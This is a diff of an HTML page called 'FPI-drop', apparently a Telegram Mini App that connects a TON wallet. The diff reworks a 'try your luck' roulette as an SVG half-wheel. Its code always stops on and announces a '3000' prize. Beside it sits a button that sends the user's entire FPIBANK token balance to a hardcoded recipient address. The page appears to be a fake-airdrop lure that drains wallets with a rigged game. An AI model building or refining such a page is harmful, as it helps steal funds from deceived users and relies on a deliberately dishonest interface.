@@ -5,12 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>FPI-drop</title>
 
+  <!-- Скрипты и стили TonConnect / Telegram, как у вас в исходном коде -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
   <script src="./js/tonconnect-sdk.min.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" />
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
-  
+
   <style>
     body {
       background-color: purple;
@@ -22,7 +23,7 @@
       flex-direction: column;
       align-items: center;
     }
-    /* Верхняя часть: заголовок, TonConnect-кнопка и кнопка отправки */
+    /* Верхняя часть: заголовок, кнопки */
     #header {
       text-align: center;
       padding-top: 20px;
@@ -30,6 +31,7 @@
     #header h1 {
       margin: 0 0 20px 0;
     }
+    /* Кнопка "Отправить все FPIBANK" */
     button#sendTransaction {
       background-color: green;
       color: white;
@@ -43,121 +45,98 @@
       opacity: 0.8;
     }
 
-    /* Контейнер для рулетки (по центру) */
+    /* Контейнер рулетки */
     .roulette-container {
+      margin-top: 40px; /* небольшой отступ сверху */
       position: relative;
-      margin-top: 50px; /* Отступ сверху, чтобы рулетка была чуть ниже блока с кнопками */
-      width: 300px;
-      height: 300px;
+      width: 400px;   /* ширина SVG */
+      height: 240px;  /* чуть больше высоты SVG (200) для указателя */
+      text-align: center;
     }
 
-    /* Само колесо рулетки (круг) */
-    .roulette-wheel {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 300px;
-      height: 300px;
-      border-radius: 50%;
-      border: 5px solid #fff;
-      /* Разделение на 5 секторов через conic-gradient:
-         0-72   deg -> 500
-         72-144 deg -> 1000
-         144-216deg -> 2000
-         216-288deg -> 3000
-         288-360deg -> 5000
-      */
-      background: conic-gradient(
-        #fa5 0deg 72deg,       /* 500 (оранжево-жёлтый) */
-        #5af 72deg 144deg,     /* 1000 (голубой) */
-        #f5a 144deg 216deg,    /* 2000 (розоватый) */
-        #5f5 216deg 288deg,    /* 3000 (зеленоватый) */
-        #f55 288deg 360deg     /* 5000 (красный) */
-      );
-      /* Начинаем с неподвижного положения (сектор "500" наверху).
-         Анимацию вращения зададим через JS. */
-      transform: rotate(0deg);
-    }
-
-    /* Указатель в верхней части рулетки */
-    .roulette-pointer {
-      position: absolute;
-      top: -10px;   /* Немного вынесен за границу круга */
-      left: 50%;
-      transform: translateX(-50%);
-      width: 0;
-      height: 0;
-      border-left: 15px solid transparent;
-      border-right: 15px solid transparent;
-      border-bottom: 20px solid white; /* Белый треугольник, указывающий вниз */
-    }
-
-    /* Стили кнопки "Испытать удачу" */
+    /* Кнопка "Испытать удачу" */
     .spin-button {
-      display: block;
-      margin: 20px auto 0 auto;
       background-color: green;
       color: white;
       padding: 10px 20px;
       border: none;
       border-radius: 5px;
       cursor: pointer;
-      text-align: center;
+      margin-top: 10px;
     }
     .spin-button:hover {
       opacity: 0.8;
     }
 
-    /* Чтобы плавно вращать колесо через transition, 
-       будем динамически прописывать transform в JS. */
-    .roulette-wheel.animate {
-      transition: transform 3s ease-out;
+    /* Блок для сообщения после остановки рулетки */
+    #resultMessage {
+      margin-top: 10px;
+      font-size: 1.1em;
+      min-height: 1.4em; /* резервируем место */
     }
 
-    /* Текстовое уведомление, когда рулетка остановилась (по желанию) */
-    #resultMessage {
-      margin-top: 15px;
-      font-size: 1.2em;
-      font-weight: bold;
-      min-height: 1.5em; /* резервируем место под текст */
+    /* Анимация вращения рулетки (через класс .spin) */
+    .spin {
+      transition: transform 3s ease-out;
     }
   </style>
 </head>
 <body>
-  <!-- Верхняя часть: заголовок, TonConnect, кнопка отправки -->
+  <!-- Верхняя часть: заголовок, TonConnect-кнопка, кнопка отправки -->
   <div id="header">
     <h1>FPI-drop</h1>
     <div id="ton-connect"></div>
     <button id="sendTransaction">Отправить все FPIBANK</button>
   </div>
 
-  <!-- Контейнер рулетки (по центру) -->
+  <!-- Контейнер для рулетки -->
   <div class="roulette-container">
-    <!-- Само колесо -->
-    <div class="roulette-wheel" id="rouletteWheel"></div>
-    <!-- Указатель -->
-    <div class="roulette-pointer"></div>
+    <!-- Само SVG (полукруг) -->
+    <svg id="rouletteSVG" width="400" height="200">
+      <!-- Группа со всеми секторами: будем вращать её по часовой стрелке -->
+      <g id="arcGroup" transform="rotate(0, 200, 200)">
+        <!-- Каждый сектор рисуем path-ом. 
+             Центр круга (200,200). Радиус 200.
+             Угол меняется с 180 до 0 (слева направо), 
+             шаг 36°, всего 5 секторов. -->
+      </g>
+    </svg>
+
+    <!-- Стрелка (указатель), которая указывает вверх, расположена ниже SVG -->
+    <div id="pointer" style="
+      position: absolute;
+      left: 50%; 
+      transform: translateX(-50%);
+      top: 200px; /* сразу под SVG (высота 200) */
+    ">
+      <!-- Простой треугольник, указывающий вверх -->
+      <svg width="30" height="30">
+        <polygon points="15,0 30,30 0,30" fill="white"/>
+      </svg>
+    </div>
+
     <!-- Кнопка "Испытать удачу" -->
     <button class="spin-button" id="spinButton">Испытать удачу</button>
-    <!-- Блок для сообщения о результате (если нужно) -->
+
+    <!-- Сообщение о результате -->
     <div id="resultMessage"></div>
   </div>
 
   <script>
-    // Инициализация Telegram WebApp
+    /****************************************************
+     * 1) Исходная логика вашего кода (TonConnect, etc.)
+     ****************************************************/
     if (typeof Telegram === "undefined") {
       window.Telegram = { WebApp: { ready: () => {}, showAlert: alert } };
     } else {
       Telegram.WebApp.ready();
     }
 
-    // Инициализация TonConnect UI
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
       buttonRootId: "ton-connect",
     });
 
-    // Адреса из вашего кода
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
     const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";
 
@@ -277,7 +256,7 @@
       }
     }
 
-    // Клик по кнопке "Отправить все FPIBANK"
+    // Кнопка "Отправить все FPIBANK"
     document.getElementById("sendTransaction").addEventListener("click", async () => {
       if (!tonConnectUI.connected) {
         Telegram.WebApp.showAlert("Сначала подключите кошелёк через TonConnect.");
@@ -291,46 +270,114 @@
       await sendAllFPIBANK(userTonAddress, recipientTonAddress);
     });
 
-    // ------------------ Логика рулетки ------------------
+    /****************************************************
+     * 2) Генерация секторов "горизонтальной" рулетки
+     ****************************************************/
 
-    const rouletteWheel = document.getElementById("rouletteWheel");
-    const spinButton = document.getElementById("spinButton");
-    const resultMessage = document.getElementById("resultMessage");
+    // Пять секторов: (подпись, startAngle, endAngle, цвет)
+    // Угол идёт от 180° (левый край) до 0° (правый край).
+    // Третий сектор (3000) как раз от 108 до 72, середина = 90°.
+    const sectors = [
+      { label: '500',   start:180, end:144, color: '#ffa500' }, // оранжевый
+      { label: '1000',  start:144, end:108, color: '#ff69b4' }, // розовый
+      { label: '3000',  start:108, end:72,  color: '#00ff00' }, // зелёный
+      { label: '2000',  start:72,  end:36,  color: '#1e90ff' }, // синий
+      { label: '5000',  start:36,  end:0,   color: '#ff0000' }, // красный
+    ];
 
-    // При нажатии на "Испытать удачу" делаем вращение,
-    // которое заканчивается на секторе "3000".
-    spinButton.addEventListener("click", () => {
-      // Убираем предыдущее сообщение
-      resultMessage.textContent = "";
+    const svg = document.getElementById('rouletteSVG');
+    const arcGroup = document.getElementById('arcGroup');
 
-      // Сбрасываем анимацию, если нажали повторно
-      rouletteWheel.classList.remove("animate");
-      rouletteWheel.style.transition = "none";
-      rouletteWheel.style.transform = "rotate(0deg)";
+    // Функция для построения дуги (одного сектора)
+    // центр (cx,cy)= (200,200), радиус r=200
+    function createArcPath(cx, cy, r, startAngle, endAngle) {
+      const largeArcFlag = 0; 
+      const sweepFlag = 0; // для дуги "сверху вниз" нам нужно задать правильный sweep
+      // Но проще проверить, какой флаг нужен. 
+      // Поскольку мы идём от 180 к 0, это убывающие углы. 
+      // Для "полукруга сверху" sweepFlag обычно 0 (дуга против часовой стрелки в терминах SVG).
+      // Попробуем так, если дуга рисуется не в ту сторону — поменяем на 1.
 
-      // Нужно небольшое время, чтобы сброс применился
+      const start = polarToCartesian(cx, cy, r, startAngle);
+      const end   = polarToCartesian(cx, cy, r, endAngle);
+
+      return [
+        `M ${cx},${cy}`,          // из центра
+        `L ${start.x},${start.y}`,// линия к началу дуги
+        `A ${r},${r} 0 ${largeArcFlag} ${sweepFlag} ${end.x},${end.y}`, // дуга
+        'Z'
+      ].join(' ');
+    }
+
+    // Перевод (угол в градусах) → (x,y) на окружности
+    // Угол 0° направлен вправо (ось X), 90° вверх, 180° влево, 270° вниз (стандарт в математике с учётом y вниз).
+    function polarToCartesian(cx, cy, r, angleDeg) {
+      const rad = angleDeg * Math.PI / 180;
+      const x = cx + r * Math.cos(rad);
+      const y = cy + r * Math.sin(rad);
+      return { x, y };
+    }
+
+    // Создаём <path> для каждого сектора + <text> для подписи
+    sectors.forEach(sec => {
+      const pathD = createArcPath(200, 200, 200, sec.start, sec.end);
+      const pathEl = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+      pathEl.setAttribute('d', pathD);
+      pathEl.setAttribute('fill', sec.color);
+      arcGroup.appendChild(pathEl);
+
+      // Текст в середине сектора
+      const midAngle = (sec.start + sec.end)/2;
+      const textPos  = polarToCartesian(200, 200, 120, midAngle); 
+      // 120 = ~60% от радиуса, чтобы подписи были ближе к центру
+      const textEl   = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+      textEl.setAttribute('x', textPos.x);
+      textEl.setAttribute('y', textPos.y);
+      textEl.setAttribute('fill', '#fff');
+      textEl.setAttribute('font-size', '18');
+      textEl.setAttribute('font-weight', 'bold');
+      textEl.setAttribute('text-anchor', 'middle');
+      textEl.setAttribute('alignment-baseline', 'middle');
+      textEl.textContent = sec.label;
+      arcGroup.appendChild(textEl);
+    });
+
+    /****************************************************
+     * 3) Анимация вращения "по часовой стрелке"
+     *    с итоговой остановкой на секторе "3000"
+     ****************************************************/
+
+    const spinButton = document.getElementById('spinButton');
+    const resultMsg  = document.getElementById('resultMessage');
+
+    spinButton.addEventListener('click', () => {
+      // Сбрасываем предыдущее состояние
+      arcGroup.classList.remove('spin');
+      arcGroup.style.transition = 'none';
+      arcGroup.setAttribute('transform', 'rotate(0,200,200)');
+      resultMsg.textContent = '';
+
+      // Запускаем анимацию (двойной requestAnimationFrame нужен,
+      // чтобы сброс успел примениться в браузере)
       requestAnimationFrame(() => {
         requestAnimationFrame(() => {
-          // Добавляем класс для плавной анимации
-          rouletteWheel.classList.add("animate");
-          // Плавное вращение за 3 секунды
-          rouletteWheel.style.transition = "transform 3s ease-out";
-          
-          // Финальный угол, чтобы сектор "3000" оказался сверху.
-          // Делает несколько полных оборотов и останавливается на 3000.
-          // Сегмент "3000" (216-288°), его середина ~252°.
-          // Для наглядности возьмём 5 полных оборотов (5*360=1800) + 252 = 2052°
-          const finalAngle = 2052;
-          rouletteWheel.style.transform = `rotate(${finalAngle}deg)`;
+          arcGroup.classList.add('spin');
+          // Плавное вращение за 3s ease-out
+          arcGroup.style.transition = 'transform 3s ease-out';
+          // Идём от 0° к -1080° (3 полных оборота по часовой стрелке),
+          // -1080 mod 360 = 0, значит визуально вернётся в исходное положение
+          // с сектором "3000" по центру.
+          arcGroup.setAttribute('transform', 'rotate(-1080,200,200)');
         });
       });
 
-      // Когда анимация завершится, выводим сообщение
-      rouletteWheel.addEventListener("transitionend", onSpinEnd, { once: true });
+      // Когда вращение закончилось — выводим сообщение
+      arcGroup.addEventListener('transitionend', onSpinEnd, { once: true });
     });
 
     function onSpinEnd() {
-      resultMessage.textContent = "Поздравляем! Вам выпало 3000";
+      // Оставляем итоговое положение (оно визуально совпадает с углом 0).
+      resultMsg.textContent = 'Выпало 3000!';
     }
   </script>
 </body>
